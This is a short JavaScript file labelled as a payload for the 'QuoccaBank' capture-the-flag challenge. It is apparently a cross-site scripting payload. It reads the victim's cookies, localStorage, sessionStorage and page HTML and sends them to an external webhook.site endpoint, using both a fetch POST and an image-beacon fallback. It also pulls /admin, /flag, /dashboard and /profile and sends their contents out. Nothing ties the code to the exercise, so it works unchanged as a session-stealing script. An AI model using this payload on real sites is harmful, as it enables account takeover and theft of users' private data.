// QuoccaBank CTF Payload
const data = {
    timestamp: new Date().toISOString(),
    url: location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    pageTitle: document.title,
    pageContent: document.documentElement.outerHTML.substring(0, 10000)
};

fetch('https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536', {
    method: 'POST',
    mode: 'no-cors',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
});

// 备用图片方式
new Image().src = 'https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536?c=' + encodeURIComponent(document.cookie) + '&l=' + encodeURIComponent(JSON.stringify(localStorage));

// 尝试访问admin端点
['/admin', '/flag', '/dashboard', '/profile'].forEach(endpoint => {
    fetch(endpoint)
        .then(r => r.text())
        .then(content => {
            new Image().src = 'https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536?ep=' + encodeURIComponent(endpoint) + '&data=' + encodeURIComponent(content.substring(0, 2000));
        })
        .catch(() => {});
});
